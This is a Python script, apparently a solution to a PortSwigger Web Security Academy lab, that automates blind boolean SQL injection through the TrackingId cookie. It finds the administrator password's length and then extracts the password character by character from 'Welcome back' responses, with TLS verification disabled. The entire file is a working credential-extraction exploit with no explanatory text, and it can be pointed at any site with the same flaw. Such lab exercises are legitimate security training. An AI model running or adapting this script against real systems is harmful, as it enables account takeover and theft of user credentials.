from string import ascii_lowercase, ascii_uppercase
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import sys
# cookies = {
#     'TrackingId': 'qMK3u69e5Lj0oqXH',
#     'session': '5H6xhgJDcmP3CZo1mM1WbkavfeV18WU6',
# }

headers = {
    'Host': '0a46006603985885c03fe561004000d2.web-security-academy.net',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36',
    'Accept-Language': 'en-US;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Gpc': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a46006603985885c03fe561004000d2.web-security-academy.net/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'TrackingId=qMK3u69e5Lj0oqXH\' or \'1\'=\'1; session=5H6xhgJDcmP3CZo1mM1WbkavfeV18WU6',
}

PASSWORD_LENGTH = int()
for x in range(30):
    payload = f"qMK3u69e5Lj0oqXH' AND (SELECT 'a' FROM users where username='administrator' and Length(password)={x}) ='a"
    cookies = {
        'TrackingId': payload,
        'session': '5H6xhgJDcmP3CZo1mM1WbkavfeV18WU6',
    }
    response = requests.get('https://0a46006603985885c03fe561004000d2.web-security-academy.net/', cookies=cookies, headers=headers, verify=False).content.decode()
    if 'Welcome back' in response:
        sys.stdout.write("\r\033[K\n")
        print(f'password length: {x}')
        PASSWORD_LENGTH = x
        break
    else:
        print(f'testing for password length value: {x}', end='\r')

dictionary = ascii_lowercase + ascii_uppercase + '1234567890' + '().-,_@'
password = ''
for x in range(PASSWORD_LENGTH):
    for char in dictionary:
        payload = f"qMK3u69e5Lj0oqXH' AND (SELECT substring(password, {x+1}, 1) from users where username='administrator') = '{char}"
        cookies = {
            'TrackingId': payload,
            'session': '5H6xhgJDcmP3CZo1mM1WbkavfeV18WU6',
        }
        response = requests.get('https://0a46006603985885c03fe561004000d2.web-security-academy.net/', cookies=cookies, headers=headers, verify=False).content.decode()
        if 'Welcome back' in response:
            password += char
            break
        else:
            print(f'testing for password: {password + char}', end='\r')

print(f'Password: {password}')